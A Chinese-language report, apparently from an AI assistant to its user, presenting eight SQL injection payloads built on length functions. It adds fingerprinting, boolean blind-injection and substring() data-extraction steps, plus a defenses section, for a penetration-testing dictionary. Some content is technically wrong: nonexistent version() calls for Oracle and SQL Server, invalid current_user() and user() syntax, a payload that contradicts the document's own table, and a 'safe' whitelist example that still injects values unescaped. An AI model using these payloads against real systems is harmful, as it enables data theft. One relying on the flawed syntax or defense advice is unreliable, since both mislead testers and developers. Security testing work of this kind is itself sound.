# SQL 注入 - 长度函数 Payload 说明

**文档**: SQL 注入长度函数技巧
**作者**: 小牛🦞
**日期**: 2026-03-09

---

## 🎯 **新增的长度函数 Payload**

### **Payload 概览**

| 数据库 | 函数 | Payload | 用途 |
|--------|------|---------|------|
| Oracle | `length()` | `1' AND length(version())>0--` | 数据库指纹识别 |
| MySQL | `length()` | `1' AND length(database())>0--` | 数据库名称长度 |
| PostgreSQL | `length()` | `1' AND length(current_user())>0--` | 当前用户长度 |
| SQL Server | `len()` | `1' AND len(db_name())>0--` | 数据库名称长度 |

---

## 📊 **详细 Payload 说明**

### **1. Oracle - length() 函数 (2 个)**

#### **Payload 1.1**
```sql
id: 1' AND length(version())>0--
```

**原理**:
- 使用 Oracle 的 `length()` 函数
- 获取数据库版本字符串的长度
- 验证函数是否存在

**适用场景**:
- 验证 Oracle 数据库
- 测试函数可用性
- 盲注测试

**示例**:
```sql
-- 原始 SQL
SELECT * FROM users WHERE id = '1'

-- 注入后
SELECT * FROM users WHERE id = '1' AND length(version())>0--'

-- 执行结果
返回正常结果（version() 不为空，长度 > 0）
```

---

#### **Payload 1.2**
```sql
userId: 1' AND length(user())>0--
```

**原理**:
- 使用 Oracle 的 `length()` 函数
- 获取当前用户名称的长度
- 验证函数是否存在

**适用场景**:
- 验证当前用户
- 测试用户权限
- 盲注测试

**示例**:
```sql
-- 原始 SQL
SELECT * FROM users WHERE user_id = '1'

-- 注入后
SELECT * FROM users WHERE user_id = '1' AND length(user())>0--'

-- 执行结果
返回正常结果（user() 不为空，长度 > 0）
```

---

### **2. MySQL - length() 函数 (2 个)**

#### **Payload 2.1**
```sql
id: 1' AND length(version())>0--
```

**原理**:
- 使用 MySQL 的 `length()` 函数
- 获取数据库版本的长度
- 验证函数是否存在

**适用场景**:
- 验证 MySQL 数据库
- 测试函数可用性
- 盲注测试

**示例**:
```sql
-- 原始 SQL
SELECT * FROM users WHERE id = '1'

-- 注入后
SELECT * FROM users WHERE id = '1' AND length(version())>0--'

-- 执行结果
返回正常结果（version() 不为空，长度 > 0）
```

---

#### **Payload 2.2**
```sql
userId: 1' AND length(database())>0--
```

**原理**:
- 使用 MySQL 的 `length()` 函数
- 获取当前数据库名称的长度
- 验证函数是否存在

**适用场景**:
- 验证当前数据库
- 测试数据库权限
- 盲注测试

**示例**:
```sql
-- 原始 SQL
SELECT * FROM users WHERE user_id = '1'

-- 注入后
SELECT * FROM users WHERE user_id = '1' AND length(database())>0--'

-- 执行结果
返回正常结果（database() 不为空，长度 > 0）
```

---

### **3. PostgreSQL - length() 函数 (2 个)**

#### **Payload 3.1**
```sql
id: 1' AND length(current_user())>0--
```

**原理**:
- 使用 PostgreSQL 的 `length()` 函数
- 获取当前用户名称的长度
- 验证函数是否存在

**适用场景**:
- 验证 PostgreSQL 数据库
- 测试当前用户
- 盲注测试

**示例**:
```sql
-- 原始 SQL
SELECT * FROM users WHERE id = '1'

-- 注入后
SELECT * FROM users WHERE id = '1' AND length(current_user())>0--'

-- 执行结果
返回正常结果（current_user() 不为空，长度 > 0）
```

---

#### **Payload 3.2**
```sql
userId: 1' AND length(current_database())>0--
```

**原理**:
- 使用 PostgreSQL 的 `length()` 函数
- 获取当前数据库名称的长度
- 验证函数是否存在

**适用场景**:
- 验证当前数据库
- 测试数据库权限
- 盲注测试

**示例**:
```sql
-- 原始 SQL
SELECT * FROM users WHERE user_id = '1'

-- 注入后
SELECT * FROM users WHERE user_id = '1' AND length(current_database())>0--'

-- 执行结果
返回正常结果（current_database() 不为空，长度 > 0）
```

---

### **4. SQL Server - len() 函数 (2 个)**

#### **Payload 4.1**
```sql
id: 1' AND len(version())>0--
```

**原理**:
- 使用 SQL Server 的 `len()` 函数
- 获取数据库版本的长度
- 验证函数是否存在

**适用场景**:
- 验证 SQL Server 数据库
- 测试函数可用性
- 盲注测试

**示例**:
```sql
-- 原始 SQL
SELECT * FROM users WHERE id = '1'

-- 注入后
SELECT * FROM users WHERE id = '1' AND len(version())>0--'

-- 执行结果
返回正常结果（@@version 不为空，长度 > 0）
```

---

#### **Payload 4.2**
```sql
userId: 1' AND len(db_name())>0--
```

**原理**:
- 使用 SQL Server 的 `len()` 函数
- 获取当前数据库名称的长度
- 验证函数是否存在

**适用场景**:
- 验证当前数据库
- 测试数据库权限
- 盲注测试

**示例**:
```sql
-- 原始 SQL
SELECT * FROM users WHERE user_id = '1'

-- 注入后
SELECT * FROM users WHERE user_id = '1' AND len(db_name())>0--'

-- 执行结果
返回正常结果（db_name() 不为空，长度 > 0）
```

---

## 🎯 **函数对比表**

| 数据库 | 长度函数 | 版本函数 | 数据库函数 | 用户函数 |
|--------|----------|----------|------------|----------|
| Oracle | `length()` | `length(version())` | - | `length(user())` |
| MySQL | `length()` | `length(version())` | `length(database())` | - |
| PostgreSQL | `length()` | - | `length(current_database())` | `length(current_user())` |
| SQL Server | `len()` | `len(@@version)` | `len(db_name())` | - |

---

## 🔍 **使用场景**

### **场景 1: 数据库指纹识别**

**目的**: 识别数据库类型

**测试顺序**:
```sql
1' AND len(version())>0--      -- SQL Server
1' AND length(version())>0--    -- MySQL/Oracle/PostgreSQL
```

**分析**:
- 如果 `len()` 成功 → SQL Server
- 如果 `length()` 成功 → MySQL/Oracle/PostgreSQL
- 如果都失败 → 其他数据库或无注入

---

### **场景 2: 盲注测试**

**目的**: 在盲注场景下验证注入

**Payload**:
```sql
1' AND length(version())>0--    -- 真（版本字符串长度 > 0）
1' AND length(version())<0--    -- 假（长度不可能 < 0）
```

**优势**:
- ✅ 不需要错误消息
- ✅ 基于布尔逻辑
- ✅ 适用于盲注

---

### **场景 3: 函数验证**

**目的**: 验证函数是否可用

**Payload**:
```sql
1' AND length(version())>0--
```

**分析**:
- 返回正常结果 → 函数可用
- 返回错误 → 函数不可用或语法错误

---

### **场景 4: 数据提取（高级）**

**目的**: 逐字符提取数据（盲注）

**Payload**:
```sql
1' AND length(version())=N--    -- N 为数字
```

**步骤**:
1. 猜测版本字符串长度（使用二分法）
2. 确认长度后，使用 `substring()` 逐字符提取

**示例**:
```sql
-- 猜测长度
1' AND length(version())>5--    -- 大于 5？
1' AND length(version())>10--   -- 大于 10？

-- 提取字符
1' AND substring(version(),1,1)='5'--
```

---

## 📊 **更新后的 Payload 统计**

| 类型 | 数量 | 更新 | 说明 |
|------|------|------|------|
| SQL 注入测试 | 65 个 | +8 | 长度函数 |
| XSS 测试 | 63 个 | - | 脚本、图片、SVG 等 |
| 路径遍历测试 | 27 个 | - | Linux、Windows |
| SSRF 测试 | 27 个 | - | 内网、云元数据 |
| 未授权访问测试 | 6 个 | - | 常见参数 |
| **总计** | **188 个** | **+8** | 完整的漏洞测试字典 |

---

## 🛠️ **防御措施**

### **1. 输入验证**

```python
# 不好的做法
user_input = request.form.get('id')
query = f"SELECT * FROM users WHERE id = '{user_input}'"

# 好的做法
user_input = request.form.get('id')
if not user_input.isdigit():
    return "Invalid ID"
query = f"SELECT * FROM users WHERE id = {int(user_input)}"
```

---

### **2. 参数化查询**

```python
# 不好的做法
cursor.execute(f"SELECT * FROM users WHERE id = '{user_input}'")

# 好的做法
cursor.execute("SELECT * FROM users WHERE id = %s", (user_input,))
```

---

### **3. 函数白名单**

```python
# 允许的函数列表
ALLOWED_FUNCTIONS = ['lower', 'upper', 'trim']

# 不好的做法
query = f"SELECT * FROM users WHERE name = '{func}({value})'"

# 好的做法
if func not in ALLOWED_FUNCTIONS:
    return "Function not allowed"
query = f"SELECT * FROM users WHERE name = {func}({value})"
```

---

### **4. 最小权限原则**

```sql
-- 不好的做法
GRANT ALL PRIVILEGES ON *.* TO 'webapp'@'localhost';

-- 好的做法
GRANT SELECT ON database.* TO 'webapp'@'localhost';
```

---

## 🦞 **总结**

牛哥哥，**长度函数 Payload 已添加完成**！🦞

**新增的 Payload (8 个)**:
1. ✅ `1' AND length(version())>0--` - Oracle
2. ✅ `1' AND length(user())>0--` - Oracle
3. ✅ `1' AND length(version())>0--` - MySQL
4. ✅ `1' AND length(database())>0--` - MySQL
5. ✅ `1' AND length(current_user())>0--` - PostgreSQL
6. ✅ `1' AND length(current_database())>0--` - PostgreSQL
7. ✅ `1' AND len(version())>0--` - SQL Server
8. ✅ `1' AND len(db_name())>0--` - SQL Server

**更新后的统计**:
- SQL 注入测试: 65 个 (+8)
- 总计: 188 个 (+8)

**核心优势**:
- 🎯 **数据库指纹识别**: 通过 `len()` vs `length()` 区分 SQL Server
- 🎯 **盲注测试**: 基于布尔逻辑的盲注
- 🎯 **函数验证**: 验证函数是否可用
- 🎯 **数据提取**: 逐字符提取数据（高级盲注）

**函数对比**:
- Oracle: `length()`
- MySQL: `length()`
- PostgreSQL: `length()`
- SQL Server: `len()`

**这些长度函数 Payload 可以帮助你更精确地识别数据库类型和进行盲注测试！🦞**
